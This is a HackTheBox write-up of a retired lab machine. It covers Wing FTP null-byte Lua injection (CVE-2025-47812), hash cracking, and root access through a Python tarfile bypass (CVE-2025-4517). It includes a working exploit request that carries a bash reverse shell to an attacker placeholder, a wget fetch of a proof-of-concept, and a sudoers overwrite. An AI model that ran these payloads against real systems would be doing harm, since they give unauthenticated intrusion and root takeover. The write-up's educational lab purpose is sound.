# HTB Writeup — WingData

- **IP:** `10.129.27.149`
- **Domain:** `wingdata.htb`
- **OS:** Linux (Debian)
- **Difficulty:** Medium

---

## Table of Contents

1. [Enumeration](#1-enumeration)
2. [Wing FTP Web Interface](#2-wing-ftp-web-interface)
3. [Unauthenticated RCE via CVE-2025-47812](#3-unauthenticated-rce-via-cve-2025-47812)
4. [Reverse Shell & Credential Harvesting](#4-reverse-shell--credential-harvesting)
5. [Cracking Hashes & SSH Access](#5-cracking-hashes--ssh-access)
6. [User Flag](#6-user-flag)
7. [Privilege Escalation via CVE-2025-4517](#7-privilege-escalation-via-cve-2025-4517)
8. [Root Flag](#8-root-flag)

---

## 1. Enumeration

### Adding the Host

```bash
echo "10.129.27.149 wingdata.htb ftp.wingdata.htb" | sudo tee -a /etc/hosts
```

### Nmap Scan

```bash
nmap -sV -sC -p 22,80,8080 --min-rate 5000 10.129.27.149
```

**Results:**

```
PORT     STATE    SERVICE  VERSION
22/tcp   open     ssh      OpenSSH 9.2p1 Debian 2+deb12u7
80/tcp   open     http     Apache httpd 2.4.66
8080/tcp filtered http-proxy
```

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | SSH | OpenSSH 9.2p1 |
| 80/tcp | HTTP | Apache, redirects to wingdata.htb |
| 8080/tcp | HTTP | Filtered |

---

## 2. Wing FTP Web Interface

Navigating to `http://wingdata.htb` reveals a company site with a "Client Portal" link pointing to `http://ftp.wingdata.htb/`.

The FTP portal redirects to `login.html`, which discloses the software version at the bottom of the page:

```
FTP server software powered by Wing FTP Server v7.4.3
```

This version is prior to 7.4.4 and is vulnerable to **CVE-2025-47812** — a pre-authentication remote code execution vulnerability.

---

## 3. Unauthenticated RCE via CVE-2025-47812

### Vulnerability Details

Wing FTP Server stores session data as Lua scripts on the filesystem using `dofile()`. The `username` field is written directly into these session files without sanitization.

By injecting a null byte (`\x00`) into the username, an attacker can break out of the Lua string variable and append arbitrary Lua code. When the server loads the session file, the injected code executes.

**Injection concept:**
```
anonymous\x00"]]..os.execute('command')..[["
```

### Exploit

Start a listener:

```bash
nc -lvnp 4444
```

Send the malicious login request using Python to correctly handle the null byte:

```python
import requests
s = requests.Session()
payload = 'anonymous\x00\"]]..\nos.execute(\'bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1\"\')..[['
r = s.post('http://ftp.wingdata.htb/loginok.html', data={'username': payload, 'password': ''})
r2 = s.get('http://ftp.wingdata.htb/dir.html')
```

The second request to `dir.html` forces the server to load the poisoned session file, triggering execution.

---

## 4. Reverse Shell & Credential Harvesting

A shell arrives as `wingftp`:

```
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp)
```

The working directory is `/opt/wftpserver`.

### Locating User XML Files

Wing FTP stores user accounts as XML files:

```bash
find /opt/wftpserver -name "*.xml" 2>/dev/null
```

Relevant files found:

```
/opt/wftpserver/Data/_ADMINISTRATOR/admins.xml
/opt/wftpserver/Data/1/users/maria.xml
/opt/wftpserver/Data/1/users/john.xml
/opt/wftpserver/Data/1/users/wacky.xml
/opt/wftpserver/Data/1/users/anonymous.xml
```

### Extracted Hashes

| User | Hash |
|------|------|
| admin | `a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba` |
| maria | `a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03` |
| john | `c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10` |
| wacky | `32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca` |

Inspecting the Lua source reveals Wing FTP uses `sha2()` with a salt (`WingFTP`):

```bash
grep -r "sha\|hash" /opt/wftpserver/lua/ServerInterface.lua
# password_md5 = sha2(temppass)
```

The hash format is therefore `sha256($pass.$salt)` — hashcat mode `1410`.

---

## 5. Cracking Hashes & SSH Access

### Cracking with Hashcat

```bash
echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" > wacky.hash
hashcat -m 1410 wacky.hash /usr/share/wordlists/rockyou.txt
```

**Result:**

```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
```

### SSH Login

```bash
ssh wacky@10.129.27.149
# password: !#7Blushing^*Bride5
```

---

## 6. User Flag

```bash
cat /home/wacky/user.txt
```

```
flag
```

---

## 7. Privilege Escalation via CVE-2025-4517

### Sudo Check

```bash
sudo -l
```

```
(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

### Analyzing the Script

The script accepts a backup `.tar` file and extracts it using Python's `tarfile` module with `filter="data"`. While the `data` filter blocks direct path traversal, the script ultimately runs as root — making it vulnerable to **CVE-2025-4517**, a symlink + hardlink bypass that allows writing to arbitrary locations on the host filesystem.

### Exploit

Download and run the public PoC. The exploit:

1. Builds a malicious tar with a nested symlink chain that exceeds `PATH_MAX`
2. Bypasses the `data` filter by exploiting `os.path.realpath()` truncation
3. Creates a hardlink to `/etc/sudoers` inside the tar
4. Writes a sudoers entry granting `wacky` full root access

```bash
# Transfer PoC to target
wget http://<ATTACKER_IP>/CVE-2025-4517-POC.py -O /tmp/CVE-2025-4517-POC.py

# Run the exploit
cd /tmp
python3 CVE-2025-4517-POC.py
```

The PoC automatically:
- Creates the malicious tar at `/opt/backup_clients/backups/backup_9999.tar`
- Triggers extraction via `sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py`
- Adds `wacky ALL=(ALL) NOPASSWD: ALL` to `/etc/sudoers`

### Getting Root

```bash
sudo /bin/bash
```

---

## 8. Root Flag

```bash
cat /root/root.txt
```

```
flag
```

---

## Attack Chain Summary

```
Nmap scan → ports 22, 80
        ↓
Add /etc/hosts → wingdata.htb, ftp.wingdata.htb
        ↓
Discover Wing FTP Server v7.4.3 at ftp.wingdata.htb
        ↓
Pre-auth RCE via CVE-2025-47812 (null byte Lua injection)
→ poisoned session file executed on dir.html request
→ reverse shell as wingftp
        ↓
Enumerate /opt/wftpserver/Data → user XML files with SHA256 hashes
→ hash format: sha256($pass.$salt) with salt "WingFTP" (mode 1410)
→ crack wacky's hash → !#7Blushing^*Bride5
        ↓
SSH as wacky → user flag
        ↓
sudo -l → NOPASSWD python3 restore_backup_clients.py
→ CVE-2025-4517: symlink chain PATH_MAX bypass
→ write wacky to sudoers
→ sudo /bin/bash → root
        ↓
Root flag captured
```

---

*Writeup written post-retirement in accordance with HackTheBox guidelines.*
